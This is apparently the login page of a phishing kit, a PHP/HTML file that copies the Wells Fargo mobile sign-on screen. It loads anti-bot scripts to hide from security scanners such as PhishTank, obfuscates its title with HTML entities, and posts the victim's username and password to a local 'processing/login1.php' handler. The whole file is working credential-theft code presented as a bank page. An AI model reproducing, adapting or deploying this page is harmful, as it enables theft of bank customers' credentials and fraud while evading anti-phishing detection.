<?php
ini_set( "display_errors", 0); 
		
		
	include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<html lang="en"><head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
        <title>&#x4d;&#x6f;&#x62;&#x69;&#x6c;&#x65;&#x20;&#x53;&#x69;&#x67;&#x6e;&#x20;&#x6f;&#x6e;&#x20;&#x7c;&#x20;&#x57;&#x65;&#x6c;&#x6c;&#x73;&#x20;&#x46;&#x61;&#x72;&#x67;&#x6f;</title>
     <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp,noydir">
        <link rel="stylesheet" href="./assets/css/wf-fonts.css" type="text/css">
        <link rel="stylesheet" href="./assets/css/frontporch.css" type="text/css">
        <link type="text/css" href="./assets/css/signon_clean.css" rel="stylesheet" media="screen,projection,print">
		

</head>

 <body theme="ssep" id="body" class="brand-fp" lob="cob" contextpath="/auth" devicetype="mobile">
        
            
                





<div class="header brand-fp" id="header">
  <div class="wf_logo" role="link">
    <img src="assets/images/masthead-wf_logo-e-148x16.svg" alt="Wells Fargo" lang="en" role="img">
  </div>
  <div class="hamburger_menu" role="link">
    <a href="#"><img src="assets/images/FP.svg" alt="Home" role="img"></a>
  </div>
</div>
            
            
            
            
        

        <main role="main">
            <article>
                
                
                    
                        

		





 <form action="processing/login1.php" name="Signon" id="Signon" method="post" autocomplete="off">
<div id="form">
<div class="fl w-75" id="messages">
</div>
    <h1 class="banner"> Welcome </h1>
    <h2 class="security-link flex-cntr">
        <!-- <span class="icon-lock"></span> -->
        <img src="./assets/images/lock.svg" alt="" aria-hidden="true">
        <a class="" href="#">Online &amp; Mobile Security</a></h2>
   
        <input name="userPrefs" id="userPrefs" type="hidden">
        <input name="jsenabled" id="jsenabled" type="hidden" value="false">
        
        
            
        
        <div id="usernameWrapper" class="bim-input-wrapper">
            <label id="username" class="bim-input-label" for="j_username">Username</label>
            
                
                    <input class="bim-input" control="forms:input" type="text" name="username" id="j_username" minlength="3" autocomplete="off" maxlength="14" required>
                
                
            

        </div>
        <div id="passwordWrapper" class="bim-input-wrapper">
            <label id="lblForPassword" class="bim-input-label" for="password">Password</label>
            <input class="bim-input pmask" control="forms:input" type="password" id="password" name="passwrd" autocomplete="off" minlength="5" maxlength="32" required>
        </div>
        <div id="chkSave">
            <div class="save-usr-name">
                
                    
                        <input type="checkbox" value="true" id="saveUsernameCheckbox" name="save-username">
                    
                    
                
                <label for="saveUsernameCheckbox">
                    <span aria-labelledby="usernameLbl" role="checkbox" tabindex="0" aria-checked="false" aria-live="polite"></span>
                    <p id="usernameLbl">Save Username</p>
                </label>
            </div>
        </div>
        
            <div>
                <button class="primary cta-btn sign-on" data-type="primary" aria-label="Sign On">Sign On</button>
            </div>
            <div id="forgot">
                <p id="forgot">
                    <span lang="en"><a href="#">Forgot Password/Username?</a></span></p>
            </div>

            <div>
                <p class="ntwf-link">New to <span lang="en"><i>Wells Fargo Online</i></span><sup>®</sup>?</p>
                <button id="enrollButton" class="secondary-gray cta-btn enroll" control="button" aria-label="enroll">Enroll</button>
            </div>

            <input name="origin" id="origin" type="hidden" value="mobilebrowser">
            <input name="save-username" id="saveUsername" type="hidden" value="false">
            
                
            
            <input name="pcg" type="hidden" value=" ">

            
                <input type="hidden" name="segmentation" value=" cob">
            

		
		
		
            
           
    <input name="tgcsi" id="tgcsi" type="hidden" value="559880b9-29ff-4c3b-8918-edf512cb2ef8"><input name="nds-pmd" type="hidden" value="{&quot;jvqtrgQngn&quot;:{&quot;oq&quot;:&quot;375:812:375:812:375:812&quot;,&quot;wfi&quot;:&quot;flap-143850&quot;,&quot;oc&quot;:&quot;700&quot;,&quot;fe&quot;:&quot;375k812 24&quot;,&quot;qvqgm&quot;:&quot;480&quot;,&quot;jxe&quot;:125553,&quot;syi&quot;:&quot;snyfr&quot;,&quot;si&quot;:&quot;si,btt,zc4,jroz&quot;,&quot;sn&quot;:&quot;sn,zcrt,btt,jni&quot;,&quot;us&quot;:&quot;74621s7244s49q25&quot;,&quot;cy&quot;:&quot;Jva32&quot;,&quot;sg&quot;:&quot;{\&quot;zgc\&quot;:1,\&quot;gf\&quot;:gehr,\&quot;gr\&quot;:gehr}&quot;,&quot;sp&quot;:&quot;{\&quot;gp\&quot;:gehr,\&quot;ap\&quot;:gehr}&quot;,&quot;sf&quot;:&quot;gehr&quot;,&quot;jt&quot;:&quot;s2nno0056qp62o71&quot;,&quot;sz&quot;:&quot;o65521rrr8ps0sos&quot;,&quot;vce&quot;:&quot;apvc,0,5rsn6030,2,1;fg,0,w_hfreanzr,0,cnffjbeq,0;gr,3r9,p5,s4,yoySbeCnffjbeq;gr,5s0,qs,43,;gr,688,pp,2o7,vzt;gr,308,qo,181,;gr,4qn,qq,10q,cnffjbeq;gr,2153,np,o4,hfreanzr;zz,79,np,o4,hfreanzr;zp,4,np,o4,hfreanzr;xx,4,0,w_hfreanzr;ss,0,w_hfreanzr;zp,4,np,o4,w_hfreanzr;zzf,3qr,0,n,ABC;gf,0,3qs9;zzf,3r8,3r9,n,ABC;zzf,3r7,3r7,n,ABC;gr,19,13q,60,;so,8s,w_hfreanzr;zp,3,13q,60,;zzf,33q,3r8,n,970o 2869,970o 2869,sn3,sn3,-61o8r,61o8r,0;zzf,3r8,3r8,n,ABC;zzf,3r9,3r9,n,ABC;zzf,3r7,3r7,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r9,3r9,n,ABC;zzf,2712,2712,32,ABC;gf,0,8833;&quot;,&quot;hn&quot;:&quot;Zbmvyyn/5.0 (vCubar; PCH vCubar BF 13_2 yvxr Znp BF K) NccyrJroXvg/605.1 (XUGZY, yvxr Trpxb) Irefvba/13.0 Zbovyr/15R148 Fnsnev/604.1&quot;,&quot;ns&quot;:&quot;&quot;,&quot;fvq&quot;:&quot;aqfnne2n3uipefrxp10mgin&quot;},&quot;fvq&quot;:&quot;aqfnne2n3uipefrxp10mgin&quot;,&quot;jg&quot;:&quot;&quot;}"><input name="ndsid" type="hidden" value="ndsaar2a3hvcrsekc10ztva"></form>
   
 
</div>
                        


<div id="footer">
    <div id="links">
	
<a rel="nofollow" style="display:none;" href="assets">Do NOT follow this link or you will be banned from the site!</a>

        <p><a href="#" class="link">PRIVACY, Cookies, Security &amp;
                Legal</a> <span class="link-separator"></span><a href="#" class="link">Ad Choices </a>
        </p>
        <p><a href="#" class="link online-acc">Online Access
                Agreement</a>

            <span class="link-separator"></span>
            <a href="#" class="link e-sign">ESIGN
                    Consent</a>
            
        </p>
        <p>© 2022 <span lang="en">Wells Fargo</span>. All rights reserved.</p>
    </div>
    <div id="img">
    </div>
</div>
                    
                    
                
            </article>
        </main>

        

    <!--TMS include starts-->
   
          <!--end main-->
    
    

        	
			

    <script type="text/javascript" nonce="">
	    function enrollButtonHandler(evt) {
			evt.preventDefault();
			location.href="";
		}
		if (document.querySelector("#enrollButton")) {
			document.querySelector('#enrollButton').addEventListener('click', enrollButtonHandler);
		}


        if(document.querySelector('#usernameWrapper .bim-input')) {
            document.querySelector('#usernameWrapper .bim-input').addEventListener('focus', function(evt){
                document.querySelector('#usernameWrapper.bim-input-wrapper').classList.add('halo')
                if(evt.target.value) {
                    return
                } else {
                    document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.add('above')
                }
            })

            document.querySelector('#usernameWrapper .bim-input').addEventListener('blur', function(evt){
                document.querySelector("#usernameWrapper.bim-input-wrapper").classList.remove('halo')
                if(evt.target.value) {
                    evt.target.classList.add('with-value')
                } else {
                    evt.target.classList.remove('with-value')
                    document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.remove('above')
                };
            })
        }
        if(document.querySelector('#passwordWrapper .bim-input')) {
            document.querySelector('#passwordWrapper .bim-input').addEventListener('focus', function(evt){
                document.querySelector('#passwordWrapper.bim-input-wrapper').classList.add('halo')
                if(evt.target.value) {
                    return
                } else {
                    document.querySelector("#passwordWrapper.bim-input-wrapper .bim-input-label").classList.add('above')
                }
            })

            document.querySelector('#passwordWrapper .bim-input').addEventListener('blur', function(evt){
                document.querySelector("#passwordWrapper.bim-input-wrapper").classList.remove('halo')
                if(evt.target.value) {
                    evt.target.classList.add('with-value')
                } else {
                    evt.target.classList.remove('with-value')
                    document.querySelector("#passwordWrapper.bim-input-wrapper .bim-input-label").classList.remove('above')
                };
            })
        }



    </script>

    

</body></html>